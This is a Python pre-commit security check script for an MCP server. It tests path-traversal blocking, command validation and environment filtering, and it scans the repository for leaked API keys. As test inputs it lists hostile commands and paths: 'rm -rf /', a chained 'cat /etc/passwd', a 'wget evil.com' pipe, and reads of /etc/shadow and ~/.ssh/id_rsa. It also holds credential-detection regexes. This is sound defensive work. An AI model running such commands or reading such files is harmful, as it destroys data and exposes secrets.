#!/usr/bin/env python3
"""
Comprehensive Security Validation Script
Created: 26/10/25 - Consolidated version
By: Daniel Potter

Combined security validation and credential scanning for MCP server.
Run before every commit to ensure repository security.

Usage:
  python scripts/security_check.py           # Run all checks
  python scripts/security_check.py --quick   # Skip credential scan
  python scripts/security_check.py --scan    # Only credential scan
"""

import os
import sys
import re
import tempfile
import argparse
from pathlib import Path

# Add src to path for testing
script_dir = os.path.dirname(__file__)
project_root = os.path.dirname(script_dir)
sys.path.insert(0, os.path.join(project_root, "src"))

# Credential patterns to detect
CREDENTIAL_PATTERNS = [
    (
        r"ctx7sk-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
        "Context7 API Key",
    ),
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Access Token"),
    (r"pk_[0-9]+_[A-Za-z0-9]{40}", "ClickUp API Token"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r"sk-[A-Za-z0-9]{48}", "OpenAI API Key"),
    (
        r'["\']?[A-Za-z0-9_]*[Kk][Ee][Yy]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']',
        "Generic API Key",
    ),
    (
        r'["\']?[A-Za-z0-9_]*[Tt][Oo][Kk][Ee][Nn]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']',
        "Generic Token",
    ),
    (
        r'["\']?[A-Za-z0-9_]*[Ss][Ee][Cc][Rr][Ee][Tt]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']',
        "Generic Secret",
    ),
]

# Files to exclude from credential scanning
EXCLUDE_PATTERNS = [
    r"\.git/",
    r"__pycache__/",
    r"\.pyc$",
    r"node_modules/",
    r"\.env\.example$",
    r"security_check\.py$",
]

# Safe placeholder patterns
SAFE_PATTERNS = [
    r"your_.*_here",
    r"your_.*_token",
    r"your_.*_key",
    r"placeholder",
    r"example_.*",
    r"fake_.*",
    r"test_.*_key",
    r"dummy_.*",
]


def import_security_modules():
    """Import and validate security modules"""
    try:
        from utils.security import (
            safe_read_file,
            safe_write_file,
            run_command,
            validate_file_path,
            filter_sensitive_environment,
            get_security_config,
            _validate_command_security,
            _is_path_allowed,
            _is_path_forbidden,
        )

        print("✅ Core security modules imported successfully")
        return {
            "safe_read_file": safe_read_file,
            "safe_write_file": safe_write_file,
            "run_command": run_command,
            "validate_file_path": validate_file_path,
            "filter_sensitive_environment": filter_sensitive_environment,
            "get_security_config": get_security_config,
            "_validate_command_security": _validate_command_security,
            "_is_path_allowed": _is_path_allowed,
            "_is_path_forbidden": _is_path_forbidden,
        }
    except ImportError as e:
        print(f"❌ Import error: {e}")
        return None


def test_path_traversal_protection(security_funcs):
    """Test path traversal attack prevention"""
    print("\n🔍 Testing Path Traversal Protection...")

    dangerous_paths = [
        "../../../etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "C:\\Windows\\System32\\config\\SAM",
    ]

    success_count = 0
    for path in dangerous_paths:
        try:
            security_funcs["safe_read_file"](path)
            print(f"❌ SECURITY FAILURE: Path traversal not blocked for {path}")
        except ValueError as e:
            if any(
                x in str(e)
                for x in [
                    "Access denied",
                    "outside allowed directories",
                    "Invalid file path",
                ]
            ):
                print(f"✅ Path traversal blocked: {path}")
                success_count += 1
            else:
                print(f"⚠️ Unexpected error for {path}: {e}")
        except (FileNotFoundError, Exception):
            print(f"✅ Path traversal blocked: {path}")
            success_count += 1

    success = success_count >= len(dangerous_paths) // 2
    if success:
        print(
            f"✅ Path traversal protection working ({success_count}/{len(dangerous_paths)} blocked)"
        )
    else:
        print(
            f"❌ Insufficient path protection ({success_count}/{len(dangerous_paths)} blocked)"
        )
    return success


def test_command_validation(security_funcs):
    """Test command validation logic"""
    print("\n🔍 Testing Command Validation Logic...")

    valid_commands = ["git status", "ls", "pwd", "echo hello"]
    invalid_commands = [
        "rm -rf /",
        "ls && cat /etc/passwd",
        "echo hello | wget evil.com",
        "malicious_command",
    ]

    valid_count = sum(
        1
        for cmd in valid_commands
        if security_funcs["_validate_command_security"](cmd)["valid"]
    )
    invalid_count = sum(
        1
        for cmd in invalid_commands
        if not security_funcs["_validate_command_security"](cmd)["valid"]
    )

    for cmd in valid_commands:
        result = security_funcs["_validate_command_security"](cmd)
        status = "✅" if result["valid"] else "❌"
        print(f"{status} Valid command: {cmd}")

    for cmd in invalid_commands:
        result = security_funcs["_validate_command_security"](cmd)
        status = "✅" if not result["valid"] else "❌"
        print(f"{status} Invalid command: {cmd}")

    success = valid_count == len(valid_commands) and invalid_count == len(
        invalid_commands
    )
    if success:
        print("✅ Command validation working correctly")
    else:
        print(
            f"❌ Command validation issues (valid: {valid_count}/{len(valid_commands)}, invalid: {invalid_count}/{len(invalid_commands)})"
        )
    return success


def test_environment_filtering(security_funcs):
    """Test environment variable filtering"""
    print("\n🔍 Testing Environment Variable Filtering...")

    original_env = os.environ.copy()
    test_vars = {
        "TEST_API_KEY": "secret123",
        "TEST_SECRET": "supersecret",
        "TEST_PASSWORD": "password123",
        "TEST_SAFE_VAR": "safe_value",
        "ANOTHER_SAFE": "also_safe",
    }

    for key, value in test_vars.items():
        os.environ[key] = value

    try:
        filtered_env = security_funcs["filter_sensitive_environment"]()

        sensitive_vars = ["TEST_API_KEY", "TEST_SECRET", "TEST_PASSWORD"]
        safe_vars = ["TEST_SAFE_VAR", "ANOTHER_SAFE"]

        sensitive_filtered = sum(1 for var in sensitive_vars if var not in filtered_env)
        safe_retained = sum(
            1
            for var in safe_vars
            if var in filtered_env and filtered_env[var] == test_vars[var]
        )

        for var in sensitive_vars:
            status = "✅" if var not in filtered_env else "❌"
            print(f"{status} Sensitive variable filtered: {var}")

        for var in safe_vars:
            status = (
                "✅"
                if var in filtered_env and filtered_env[var] == test_vars[var]
                else "❌"
            )
            print(f"{status} Safe variable retained: {var}")

        success = sensitive_filtered == len(sensitive_vars) and safe_retained == len(
            safe_vars
        )
        if success:
            print("✅ Environment variable filtering working correctly")
        else:
            print("❌ Environment variable filtering has issues")
        return success

    finally:
        for key in test_vars:
            if key in os.environ:
                del os.environ[key]


def test_file_size_protection(security_funcs):
    """Test file size limit protection"""
    print("\n🔍 Testing File Size Protection...")

    with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
        content = "A" * 100
        f.write(content)
        temp_path = f.name

    try:
        # Test with sufficient limit
        try:
            result = security_funcs["safe_read_file"](temp_path, max_size=200)
            size_test_1 = len(result) == 100
            print(
                "✅ File reading with sufficient limit works"
                if size_test_1
                else "❌ File reading returned wrong length"
            )
        except Exception as e:
            print(f"❌ File reading with sufficient limit failed: {e}")
            size_test_1 = False

        # Test with insufficient limit
        try:
            security_funcs["safe_read_file"](temp_path, max_size=50)
            print("❌ SECURITY FAILURE: File size limit not enforced")
            size_test_2 = False
        except ValueError as e:
            size_test_2 = "too large" in str(e)
            print(
                "✅ File size limit enforced correctly"
                if size_test_2
                else f"⚠️ Unexpected error: {e}"
            )
        except Exception as e:
            print(f"⚠️ Unexpected exception: {e}")
            size_test_2 = False

        return size_test_1 and size_test_2

    finally:
        try:
            os.unlink(temp_path)
        except:
            pass


def test_security_configuration(security_funcs):
    """Test security configuration"""
    print("\n🔍 Testing Security Configuration...")

    try:
        config = security_funcs["get_security_config"]()

        required_keys = [
            "allowed_commands",
            "hardening_enabled",
            "security_version",
            "command_allowlist_active",
            "path_validation_active",
        ]
        missing_keys = [key for key in required_keys if key not in config]

        if missing_keys:
            print(f"❌ Missing security config keys: {missing_keys}")
            return False

        if not config["hardening_enabled"]:
            print("❌ SECURITY FAILURE: Security hardening not enabled")
            return False

        if not config["command_allowlist_active"]:
            print("❌ SECURITY FAILURE: Command allowlist not active")
            return False

        print("✅ Security configuration valid")
        print(f"   - Security version: {config['security_version']}")
        print(f"   - Allowed commands: {len(config['allowed_commands'])}")
        print(f"   - Hardening enabled: {config['hardening_enabled']}")
        return True

    except Exception as e:
        print(f"❌ Error getting security configuration: {e}")
        return False


def test_path_validation_functions(security_funcs):
    """Test path validation helper functions"""
    print("\n🔍 Testing Path Validation Functions...")

    cwd = os.getcwd()
    test_file_in_cwd = os.path.join(cwd, "test_file.txt")

    try:
        path_obj = Path(test_file_in_cwd).resolve()
        allowed_test = security_funcs["_is_path_allowed"](path_obj)
        print(
            "✅ Current directory path correctly allowed"
            if allowed_test
            else "❌ Current directory path incorrectly blocked"
        )
    except Exception as e:
        print(f"⚠️ Error testing path allowed: {e}")
        allowed_test = False

    try:
        forbidden_paths = ["/etc/passwd", "C:\\Windows\\System32\\config\\SAM"]
        forbidden_blocked = 0

        for path_str in forbidden_paths:
            try:
                path_obj = Path(path_str)
                if security_funcs["_is_path_forbidden"](path_obj):
                    print(f"✅ Forbidden path correctly blocked: {path_str}")
                    forbidden_blocked += 1
                else:
                    print(f"⚠️ Forbidden path not blocked: {path_str}")
            except Exception:
                forbidden_blocked += 1

        forbidden_test = forbidden_blocked > 0
    except Exception as e:
        print(f"⚠️ Error testing forbidden paths: {e}")
        forbidden_test = False

    return allowed_test and forbidden_test


def is_excluded_file(file_path):
    """Check if file should be excluded from scanning"""
    file_str = str(file_path)
    return any(re.search(pattern, file_str) for pattern in EXCLUDE_PATTERNS)


def is_safe_placeholder(text):
    """Check if detected credential is actually a safe placeholder"""
    text_lower = text.lower()
    return any(re.search(pattern, text_lower) for pattern in SAFE_PATTERNS)


def scan_file(file_path):
    """Scan a single file for credential patterns"""
    findings = []

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        for line_num, line in enumerate(content.split("\n"), 1):
            for pattern, description in CREDENTIAL_PATTERNS:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    matched_text = match.group(0)

                    if is_safe_placeholder(matched_text):
                        continue

                    findings.append(
                        {
                            "file": file_path,
                            "line": line_num,
                            "type": description,
                            "match": (
                                matched_text[:50] + "..."
                                if len(matched_text) > 50
                                else matched_text
                            ),
                            "context": (
                                line.strip()[:100] + "..."
                                if len(line.strip()) > 100
                                else line.strip()
                            ),
                        }
                    )

    except Exception as e:
        print(f"⚠️ Error scanning {file_path}: {e}")

    return findings


def scan_credentials(root_path="."):
    """Scan repository for credentials"""
    print("\n🔍 Scanning repository for potential credential exposures...")
    print(f"📁 Root path: {os.path.abspath(root_path)}")

    all_findings = []
    files_scanned = 0

    for root, dirs, files in os.walk(root_path):
        dirs[:] = [d for d in dirs if not d.startswith(".")]

        for file in files:
            file_path = Path(root) / file

            if is_excluded_file(file_path):
                continue

            if file_path.suffix.lower() in [
                ".py",
                ".md",
                ".txt",
                ".json",
                ".yaml",
                ".yml",
                ".env",
                ".cfg",
                ".ini",
                ".sh",
                ".bat",
            ]:
                findings = scan_file(file_path)
                all_findings.extend(findings)
                files_scanned += 1

    print(f"📊 Scanned {files_scanned} files")

    if not all_findings:
        print("✅ No credential exposures detected!")
        print("🔒 Repository appears secure")
        return True

    print(f"❌ Found {len(all_findings)} potential credential exposures:")
    print()

    for finding in all_findings:
        print(f"🚨 {finding['type']}")
        print(f"   📁 File: {finding['file']}")
        print(f"   📍 Line: {finding['line']}")
        print(f"   🔍 Match: {finding['match']}")
        print(f"   📄 Context: {finding['context']}")
        print()

    print("🔧 Recommended Actions:")
    print("1. Replace actual credentials with placeholders (e.g., 'your_api_key_here')")
    print("2. Move real credentials to environment variables")
    print("3. Add sensitive files to .gitignore")
    print("4. Use .env.example for configuration templates")

    return False


def run_security_validation():
    """Run comprehensive security validation"""
    print("🔒 MCP Server Security Validation")
    print("=" * 55)

    # Import security modules
    security_funcs = import_security_modules()
    if not security_funcs:
        return False

    # Run security tests
    tests = [
        (
            "Path Traversal Protection",
            lambda: test_path_traversal_protection(security_funcs),
        ),
        ("Command Validation Logic", lambda: test_command_validation(security_funcs)),
        ("Environment Filtering", lambda: test_environment_filtering(security_funcs)),
        ("File Size Protection", lambda: test_file_size_protection(security_funcs)),
        ("Security Configuration", lambda: test_security_configuration(security_funcs)),
        (
            "Path Validation Functions",
            lambda: test_path_validation_functions(security_funcs),
        ),
    ]

    passed = 0
    total = len(tests)

    for test_name, test_func in tests:
        try:
            if test_func():
                passed += 1
        except Exception as e:
            print(f"❌ {test_name} failed with exception: {e}")

    print("\n" + "=" * 55)
    print(f"🔒 Security Validation Results: {passed}/{total} tests passed")

    if passed == total:
        print("✅ ALL SECURITY TESTS PASSED - System is hardened")
        return True
    elif passed >= total * 0.75:
        print("⚠️ MOST SECURITY TESTS PASSED - Review remaining issues")
        return True
    else:
        print("❌ SIGNIFICANT SECURITY FAILURES - Review and fix issues")
        return False


def main():
    """Main security check function"""
    parser = argparse.ArgumentParser(
        description="Comprehensive Security Check for MCP Server"
    )
    parser.add_argument("--quick", action="store_true", help="Skip credential scanning")
    parser.add_argument(
        "--scan", action="store_true", help="Only run credential scanning"
    )
    args = parser.parse_args()

    print("🔒 MCP Server Comprehensive Security Check")
    print("=" * 50)

    if args.scan:
        # Only credential scanning
        print("📊 Running Credential Scan Only")
        return 0 if scan_credentials() else 1

    # Run security validation
    security_passed = run_security_validation()

    if args.quick:
        # Skip credential scanning
        print("\n⚡ Quick mode: Skipping credential scan")
        return 0 if security_passed else 1

    # Run credential scanning
    print("\n" + "=" * 50)
    print("🔍 Credential Exposure Check")
    print("=" * 50)
    credentials_clean = scan_credentials()

    # Final result
    print("\n" + "=" * 50)
    print("🎯 FINAL SECURITY STATUS")
    print("=" * 50)

    if security_passed and credentials_clean:
        print("✅ ALL SECURITY CHECKS PASSED")
        print("🔒 Repository is secure and ready for commit")
        return 0
    elif security_passed:
        print("⚠️ Security validation passed but credentials found")
        print("🔧 Fix credential exposures before committing")
        return 1
    elif credentials_clean:
        print("⚠️ No credentials found but security validation failed")
        print("🔧 Fix security issues before committing")
        return 1
    else:
        print("❌ MULTIPLE SECURITY ISSUES DETECTED")
        print("🚨 Fix all issues before committing")
        return 1


if __name__ == "__main__":
    sys.exit(main())
